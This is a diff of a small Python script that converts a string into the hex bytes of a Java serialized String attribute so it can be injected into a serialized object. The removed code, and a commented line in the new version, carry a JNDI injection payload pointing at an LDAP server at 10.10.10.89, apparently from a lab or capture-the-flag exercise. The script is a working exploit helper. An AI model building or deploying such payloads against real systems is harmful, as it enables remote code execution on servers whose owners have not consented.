@@ -1,8 +1,12 @@
-# This script helps to build the right hexadecimal/binary payload 
-# for a Java serialized String attribute.
-# Prints payload for further parsing.
+# This script is part of a shell script for changing values of an Java
+# serialized object. Changing a String attribute to be exactly.
 
-# This function a hexadecimal string of the converted payload
+# The script converts a given string to its hexadecimal representation
+# and prints it to stdout for further parsing.
+
+import sys
+
+# Building the payload 
 def build_hex_payload(string):
 
     # A Java serialized String attribute contains the length of its String
@@ -18,7 +22,7 @@ def build_hex_payload(string):
          
         hex_payload += converted
         
-        # Split into groups of 2 bytes delimited  by whitespace
+        # Split into groups of 2 bytes delimited by a whitespace
         if turns % 2 == 1:
             hex_payload += "\ "
 
@@ -30,6 +34,8 @@ def build_hex_payload(string):
 
     return hex_payload
 
-# JNDI request to LDAP server as String
-payload  = "${jndi:ldap://10.10.10.89/}"
-print( build_hex_payload(payload)[:-2])
+if __name__ == "__main__":
+    # JNDI request to LDAP server as String
+    #payload  = "${jndi:ldap://10.10.10.89/}"
+    payload = sys.argv[1]
+    print( build_hex_payload(payload)[:-2])
